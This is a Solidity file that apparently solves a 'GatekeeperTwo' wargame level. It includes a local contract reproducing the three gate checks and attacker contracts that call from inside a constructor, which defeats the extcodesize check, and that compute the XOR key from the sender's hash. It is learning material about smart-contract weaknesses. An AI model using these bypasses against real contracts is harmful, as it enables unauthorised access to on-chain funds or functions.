// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface ITester {
    function gateOne() external view returns(bool);
    function gateTwo() external view returns(bool);
    function gateThree(bytes8 _gateKey) external view returns(bool);
}

contract TesterAttacker {
    bool public gate1;
    bool public gate2;
    bool public gate3;

    constructor(address to) {
        ITester tester = ITester(to);
        bytes8 _gateKey = bytes8(
            uint64(
                bytes8(keccak256(abi.encodePacked(this)))
            ) ^ type(uint64).max
        );

        gate1 = tester.gateOne();
        gate2 = tester.gateTwo();
        gate3 = tester.gateThree(_gateKey);
    }
}

contract Tester {
    function gateOne() public view returns(bool) {
        return msg.sender != tx.origin;
    }

    function gateTwo() public view returns(bool) {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        return x == 0;
    }

    function gateThree(bytes8 _gateKey) public view returns(bool) {
        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max;
    }
}

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    bool public entered;

    constructor(address to) {
        bytes8 _gateKey = bytes8(
            uint64(
                bytes8(keccak256(abi.encodePacked(this)))
            ) ^ type(uint64).max
        );
        
        entered = IGatekeeperTwo(to).enter(_gateKey);
    }
}